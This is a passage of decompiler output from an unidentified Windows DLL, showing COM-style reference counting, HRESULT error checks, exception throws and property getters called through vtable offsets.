  *(_DWORD *)(a1 + 20) = 0;
  v21 = (volatile LONG **)(a1 + 24);
  *(_DWORD *)(a1 + 24) = 0;
  v20 = (volatile LONG **)(a1 + 28);
  *(_DWORD *)(a1 + 28) = 0;
  LOBYTE(v28) = 7;
  sub_1004A75F(0, (int *)&v25, &a2);
  LOBYTE(v28) = 8;
  sub_1004A7B4(v3, (int *)&v26, &a2);
  LOBYTE(v28) = 9;
  sub_1004A809(v4, (int *)v27, &a2);
  LOBYTE(v28) = 10;
  if ( v25 )
  {
    *(_DWORD *)(a1 + 8) = 1;
    if ( !v25 )
      sub_1004AEC0(-2147467261);
    v5 = (volatile LONG **)sub_1004A03B(v25, &v22);
    LOBYTE(v28) = 11;
    sub_10048559(v5, v2);
    LOBYTE(v28) = 10;
    if ( v22 )
    {
      sub_10008E98(v22);
      v22 = 0;
    }
    if ( !v25 )
      sub_1004AEC0(-2147467261);
    v6 = (volatile LONG **)sub_1004A13E(v25, &v22);
    LOBYTE(v28) = 12;
    sub_10048559(v6, v24);
    LOBYTE(v28) = 10;
    if ( v22 )
    {
      sub_10008E98(v22);
      v22 = 0;
    }
    if ( !v25 )
      sub_1004AEC0(-2147467261);
    v7 = (volatile LONG **)sub_1004A0E6(v25, &v22);
    LOBYTE(v28) = 13;
  }
  else if ( v26 )
  {
    *(_DWORD *)(a1 + 8) = 2;
    if ( !v26 )
      sub_1004AEC0(-2147467261);
    v8 = (volatile LONG **)sub_1004A196(v26, &v22);
    LOBYTE(v28) = 14;
    sub_10048559(v8, v2);
    LOBYTE(v28) = 10;
    if ( v22 )
    {
      sub_10008E98(v22);
      v22 = 0;
    }
    if ( !v26 )
      sub_1004AEC0(-2147467261);
    v9 = (volatile LONG **)sub_1004A299(v26, &v22);
    LOBYTE(v28) = 15;
    sub_10048559(v9, v24);
    LOBYTE(v28) = 10;
    if ( v22 )
    {
      sub_10008E98(v22);
      v22 = 0;
    }
    if ( !v26 )
      sub_1004AEC0(-2147467261);
    v7 = (volatile LONG **)sub_1004A241(v26, &v22);
    LOBYTE(v28) = 16;
  }
  else
  {
    if ( !v27[0] )
    {
      sub_10016441(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    *(_DWORD *)(a1 + 8) = 3;
    if ( !v27[0] )
      sub_1004AEC0(-2147467261);
    v10 = (volatile LONG **)sub_10049F38(v27[0], &v22);
    LOBYTE(v28) = 17;
    sub_10048559(v10, v2);
    LOBYTE(v28) = 10;
    if ( v22 )
    {
      sub_10008E98(v22);
      v22 = 0;
    }
    if ( !v27[0] )
      sub_1004AEC0(-2147467261);
    v11 = (volatile LONG **)sub_10049EE0(v27[0], &v22);
    LOBYTE(v28) = 18;
    sub_10048559(v11, v24);
    LOBYTE(v28) = 10;
    if ( v22 )
    {
      sub_10008E98(v22);
      v22 = 0;
    }
    if ( !v27[0] )
      sub_1004AEC0(-2147467261);
    v7 = (volatile LONG **)sub_10049FE3(v27[0], &v22);
    LOBYTE(v28) = 19;
  }
  sub_10048559(v7, v23);
  LOBYTE(v28) = 10;
  if ( v22 )
  {
    sub_10008E98(v22);
    v22 = 0;
  }
  LOBYTE(v28) = 20;
  v12 = (void *)sub_1004A494((int)&a2);
  v13 = (volatile LONG **)sub_10049CD1(v12, &v22);
  LOBYTE(v28) = 21;
  sub_10048559(v13, v21);
  LOBYTE(v28) = 20;
  if ( v22 )
  {
    sub_10008E98(v22);
    v22 = 0;
  }
  v14 = (void *)sub_1004A494((int)&a2);
  v15 = (volatile LONG **)sub_10049D7F(v14, &v23);
  LOBYTE(v28) = 22;
  sub_10048559(v15, v20);
  LOBYTE(v28) = 20;
  if ( v23 )
  {
    sub_10008E98((volatile LONG *)v23);
    v23 = 0;
  }
  v28 = 10;
  v16 = a2;
  sub_1004A536(a2, (int *)(a1 + 4));
  LOBYTE(v28) = 9;
  if ( v27[0] )
    (*(void (__stdcall **)(void *))(*(_DWORD *)v27[0] + 8))(v27[0]);
  LOBYTE(v28) = 8;
  if ( v26 )
    (*(void (__stdcall **)(void *))(*(_DWORD *)v26 + 8))(v26);
  LOBYTE(v28) = 7;
  if ( v25 )
    (*(void (__stdcall **)(void *))(*(_DWORD *)v25 + 8))(v25);
  v28 = -1;
  if ( v16 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v16 + 8))(v16);
  return a1;
}
// 10049521: variable 'v3' is possibly undefined
// 10049531: variable 'v4' is possibly undefined
// 10095D54: using guessed type int (__thiscall *off_10095D54)(void *Block, char);
// 10095DF0: using guessed type int (__thiscall *off_10095DF0)(void *Block, char);

//----- (10049885) --------------------------------------------------------
_DWORD *__thiscall sub_10049885(_DWORD *Block, char a2)
{
  sub_100498A8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100498A8) --------------------------------------------------------
int __thiscall sub_100498A8(_DWORD *this)
{
  volatile LONG *v2; // esi
  volatile LONG *v3; // esi
  volatile LONG *v4; // esi
  volatile LONG *v5; // esi
  volatile LONG *v6; // esi
  int result; // eax

  *this = &off_10095DF0;
  v2 = (volatile LONG *)this[7];
  if ( v2 )
  {
    sub_10008E98(v2);
    this[7] = 0;
  }
  v3 = (volatile LONG *)this[6];
  if ( v3 )
  {
    sub_10008E98(v3);
    this[6] = 0;
  }
  v4 = (volatile LONG *)this[5];
  if ( v4 )
  {
    sub_10008E98(v4);
    this[5] = 0;
  }
  v5 = (volatile LONG *)this[4];
  if ( v5 )
  {
    sub_10008E98(v5);
    this[4] = 0;
  }
  v6 = (volatile LONG *)this[3];
  if ( v6 )
  {
    sub_10008E98(v6);
    this[3] = 0;
  }
  result = this[1];
  if ( result )
    result = (*(int (__stdcall **)(_DWORD))(*(_DWORD *)result + 8))(this[1]);
  *this = &off_10095D54;
  return result;
}
// 10095D54: using guessed type int (__thiscall *off_10095D54)(void *Block, char);
// 10095DF0: using guessed type int (__thiscall *off_10095DF0)(void *Block, char);

//----- (1004994E) --------------------------------------------------------
bool __cdecl sub_1004994E(int a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // ecx
  int v4; // edi
  int v5; // esi
  int v6; // ecx
  bool v7; // bl
  int v9; // [esp+Ch] [ebp-18h] BYREF
  int v10; // [esp+10h] [ebp-14h] BYREF
  int v11; // [esp+14h] [ebp-10h] BYREF
  int v12; // [esp+20h] [ebp-4h]

  v12 = 0;
  sub_1004A75F(v1, &v11, &a1);
  LOBYTE(v12) = 1;
  sub_1004A7B4(v2, &v10, &a1);
  LOBYTE(v12) = 2;
  sub_1004A809(v3, &v9, &a1);
  LOBYTE(v12) = 3;
  v4 = v11;
  v5 = v10;
  v6 = v9;
  v7 = v11 || v10 || v9;
  LOBYTE(v12) = 2;
  if ( v9 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v9 + 8))(v9);
  LOBYTE(v12) = 1;
  if ( v5 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v5 + 8))(v6, v5);
  LOBYTE(v12) = 0;
  if ( v4 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v4 + 8))(v6, v4);
  v12 = -1;
  if ( a1 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a1 + 8))(a1);
  return v7;
}
// 10049969: variable 'v1' is possibly undefined
// 10049979: variable 'v2' is possibly undefined
// 10049989: variable 'v3' is possibly undefined
// 100499D5: variable 'v6' is possibly undefined

//----- (10049A08) --------------------------------------------------------
_DWORD *__thiscall sub_10049A08(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 3);
  return a2;
}

//----- (10049A3F) --------------------------------------------------------
_DWORD *__thiscall sub_10049A3F(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 6);
  return a2;
}

//----- (10049A76) --------------------------------------------------------
_DWORD *__thiscall sub_10049A76(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 7);
  return a2;
}

//----- (10049AAD) --------------------------------------------------------
_DWORD *__thiscall sub_10049AAD(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 4);
  return a2;
}

//----- (10049AE4) --------------------------------------------------------
_DWORD *__thiscall sub_10049AE4(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 5);
  return a2;
}

//----- (10049B1B) --------------------------------------------------------
char sub_10049B1B()
{
  return 1;
}

//----- (10049B1E) --------------------------------------------------------
void __thiscall sub_10049B1E(int *this, int a2, int a3)
{
  int v3; // ebx
  int *p_pExceptionObject; // eax
  _ThrowInfo *v5; // ecx
  int v6; // edi
  _ThrowInfo *v7; // ecx
  _ThrowInfo *v8; // ecx
  int v9; // edi
  _ThrowInfo *v10[4]; // [esp-4h] [ebp-3Ch] BYREF
  _ThrowInfo **v11; // [esp+Ch] [ebp-2Ch]
  int v12; // [esp+10h] [ebp-28h] BYREF
  int v13; // [esp+14h] [ebp-24h] BYREF
  int v14; // [esp+18h] [ebp-20h] BYREF
  int pExceptionObject; // [esp+1Ch] [ebp-1Ch] BYREF
  int v16; // [esp+20h] [ebp-18h] BYREF
  int v17; // [esp+24h] [ebp-14h] BYREF
  int v18; // [esp+28h] [ebp-10h] BYREF
  int v19; // [esp+34h] [ebp-4h]

  v19 = 3;
  v17 = 0;
  v18 = 0;
  v3 = 0;
  v16 = 0;
  if ( this[2] == 1 )
  {
    sub_1004A8CA(this + 1, &v17, this + 1);
    v9 = v17;
    if ( v17 )
    {
      v10[0] = v8;
      v11 = v10;
      sub_100484EE((int *)(a2 + 4), v10);
      LOBYTE(v19) = 4;
      if ( !v9 )
        sub_1004AEC0(-2147467261);
      LOBYTE(v19) = 3;
      sub_1004A093(v9, (volatile LONG *)v10[0]);
      goto LABEL_21;
    }
    sub_10016441(&v12);
    v10[0] = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v12;
LABEL_5:
    _CxxThrowException(p_pExceptionObject, v10[0]);
  }
  if ( this[2] == 2 )
  {
    sub_1004A972(this + 1, &v16, this + 1);
    v3 = v16;
    if ( v16 )
    {
      v10[0] = v7;
      v11 = v10;
      sub_100484EE((int *)(a2 + 4), v10);
      LOBYTE(v19) = 6;
      if ( !v3 )
        sub_1004AEC0(-2147467261);
      LOBYTE(v19) = 3;
      sub_1004A1EE(v3, (volatile LONG *)v10[0]);
      goto LABEL_21;
    }
    sub_10016441(&v13);
    v10[0] = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v13;
    goto LABEL_5;
  }
  if ( this[2] != 3 )
  {
    sub_10016441(&pExceptionObject);
    v10[0] = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_5;
  }
  sub_1004A91E(this + 1, &v18, this + 1);
  v6 = v18;
  if ( !v18 )
  {
    sub_10016441(&v14);
    v10[0] = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v14;
    goto LABEL_5;
  }
  v10[0] = v5;
  v11 = v10;
  sub_100484EE((int *)(a2 + 4), v10);
  LOBYTE(v19) = 5;
  if ( !v6 )
    sub_1004AEC0(-2147467261);
  LOBYTE(v19) = 3;
  sub_10049F90(v6, (volatile LONG *)v10[0]);
LABEL_21:
  LOBYTE(v19) = 2;
  if ( v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 8))(v3);
  LOBYTE(v19) = 1;
  if ( v18 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v18 + 8))(v18);
  LOBYTE(v19) = 0;
  if ( v17 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v17 + 8))(v17);
  v19 = -1;
  sub_1004A88E(&a2);
}
// 10049B9E: variable 'v5' is possibly undefined
// 10049BFD: variable 'v7' is possibly undefined
// 10049C5B: variable 'v8' is possibly undefined

//----- (10049CD1) --------------------------------------------------------
_DWORD *__thiscall sub_10049CD1(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 52))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E14);
  sub_10048503(a2, v5);
  return a2;
}

//----- (10049D29) --------------------------------------------------------
_DWORD *__userpurge sub_10049D29@<eax>(int *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v2 = *a1;
  v5 = 0;
  v3 = (*(int (__stdcall **)(int *, int *))(v2 + 156))(a1, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)a1, (int)&unk_10095E14);
  *a2 = v5;
  return a2;
}

//----- (10049D7F) --------------------------------------------------------
_DWORD *__thiscall sub_10049D7F(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 164))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E14);
  sub_10048503(a2, v5);
  return a2;
}

//----- (10049DDA) --------------------------------------------------------
_DWORD *__userpurge sub_10049DDA@<eax>(int *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v2 = *a1;
  v5 = 0;
  v3 = (*(int (__stdcall **)(int *, int *))(v2 + 372))(a1, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)a1, (int)&unk_10095E14);
  *a2 = v5;
  return a2;
}

//----- (10049E30) --------------------------------------------------------
_DWORD *__thiscall sub_10049E30(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 32))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095CF0);
  sub_10048503(a2, v5);
  return a2;
}

//----- (10049E88) --------------------------------------------------------
_DWORD *__thiscall sub_10049E88(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 76))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095CF0);
  sub_10048503(a2, v5);
  return a2;
}

//----- (10049EE0) --------------------------------------------------------
_DWORD *__thiscall sub_10049EE0(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 48))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E24);
  sub_10048503(a2, v5);
  return a2;
}

//----- (10049F38) --------------------------------------------------------
_DWORD *__thiscall sub_10049F38(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 72))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E24);
  sub_10048503(a2, v5);
  return a2;
}

//----- (10049F90) --------------------------------------------------------
int __userpurge sub_10049F90@<eax>(int a1@<edi>, volatile LONG *a2)
{
  volatile LONG v2; // eax
  int result; // eax

  if ( a2 )
    v2 = *a2;
  else
    v2 = 0;
  result = (*(int (__stdcall **)(int, volatile LONG))(*(_DWORD *)a1 + 76))(a1, v2);
  if ( result < 0 )
    sub_1004AED0(result, a1, (int)&unk_10095E24);
  if ( a2 )
    return sub_10008E98(a2);
  return result;
}

//----- (10049FE3) --------------------------------------------------------
_DWORD *__thiscall sub_10049FE3(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 80))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E24);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A03B) --------------------------------------------------------
_DWORD *__thiscall sub_1004A03B(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 32))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E44);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A093) --------------------------------------------------------
int __userpurge sub_1004A093@<eax>(int a1@<edi>, volatile LONG *a2)
{
  volatile LONG v2; // eax
  int result; // eax

  if ( a2 )
    v2 = *a2;
  else
    v2 = 0;
  result = (*(int (__stdcall **)(int, volatile LONG))(*(_DWORD *)a1 + 36))(a1, v2);
  if ( result < 0 )
    sub_1004AED0(result, a1, (int)&unk_10095E44);
  if ( a2 )
    return sub_10008E98(a2);
  return result;
}

//----- (1004A0E6) --------------------------------------------------------
_DWORD *__thiscall sub_1004A0E6(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 40))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E44);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A13E) --------------------------------------------------------
_DWORD *__thiscall sub_1004A13E(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 48))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E44);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A196) --------------------------------------------------------
_DWORD *__thiscall sub_1004A196(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 28))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E34);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A1EE) --------------------------------------------------------
int __userpurge sub_1004A1EE@<eax>(int a1@<edi>, volatile LONG *a2)
{
  volatile LONG v2; // eax
  int result; // eax

  if ( a2 )
    v2 = *a2;
  else
    v2 = 0;
  result = (*(int (__stdcall **)(int, volatile LONG))(*(_DWORD *)a1 + 32))(a1, v2);
  if ( result < 0 )
    sub_1004AED0(result, a1, (int)&unk_10095E34);
  if ( a2 )
    return sub_10008E98(a2);
  return result;
}

//----- (1004A241) --------------------------------------------------------
_DWORD *__thiscall sub_1004A241(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 36))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E34);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A299) --------------------------------------------------------
_DWORD *__thiscall sub_1004A299(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 44))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095E34);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A2F1) --------------------------------------------------------
_DWORD *__thiscall sub_1004A2F1(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 68))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095CD0);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A349) --------------------------------------------------------
_DWORD *__thiscall sub_1004A349(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 160))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095CD0);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A3A4) --------------------------------------------------------
_DWORD *__thiscall sub_1004A3A4(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 168))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095CD0);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A3FF) --------------------------------------------------------
_DWORD *__thiscall sub_1004A3FF(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF

  v5 = 0;
  v3 = (*(int (__stdcall **)(void *, int *))(*(_DWORD *)this + 176))(this, &v5);
  if ( v3 < 0 )
    sub_1004AED0(v3, (int)this, (int)&unk_10095CD0);
  sub_10048503(a2, v5);
  return a2;
}

//----- (1004A494) --------------------------------------------------------
int __usercall sub_1004A494@<eax>(int a1@<esi>)
{
  if ( !*(_DWORD *)a1 )
    sub_1004AEC0(-2147467261);
  return *(_DWORD *)a1;
}

//----- (1004A536) --------------------------------------------------------
int *__usercall sub_1004A536@<eax>(int a1@<eax>, int *a2@<esi>)
{
  int v2; // edi

  v2 = *a2;
  if ( *a2 != a1 )
  {
    *a2 = a1;
    if ( a1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)a1 + 4))(a1);
    if ( v2 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v2 + 8))(v2);
  }
  return a2;
}

//----- (1004A598) --------------------------------------------------------
int *__userpurge sub_1004A598@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004AA66(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A5FD) --------------------------------------------------------
int *__thiscall sub_1004A5FD(int *this, int *a2, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = this;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_100477CE(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A651) --------------------------------------------------------
int *__userpurge sub_1004A651@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_10047AB6(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A6BA) --------------------------------------------------------
_DWORD *__usercall sub_1004A6BA@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004A70A) --------------------------------------------------------
int *__userpurge sub_1004A70A@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004AB3A(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A75F) --------------------------------------------------------
int *__userpurge sub_1004A75F@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004ABC4(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A7B4) --------------------------------------------------------
int *__userpurge sub_1004A7B4@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004AC40(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A809) --------------------------------------------------------
int *__userpurge sub_1004A809@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004ACBC(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A88E) --------------------------------------------------------
void __thiscall sub_1004A88E(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1004AD38((int)this);
}

//----- (1004A8CA) --------------------------------------------------------
int *__thiscall sub_1004A8CA(int *this, int *a2, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = this;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004ABC4(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A91E) --------------------------------------------------------
int *__thiscall sub_1004A91E(int *this, int *a2, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = this;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004ACBC(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004A972) --------------------------------------------------------
int *__thiscall sub_1004A972(int *this, int *a2, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = this;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004AC40(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004AA66) --------------------------------------------------------
int __thiscall sub_1004AA66(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v5; // eax
  int v7; // [esp+Ch] [ebp-10h] BYREF
  int v8; // [esp+18h] [ebp-4h]

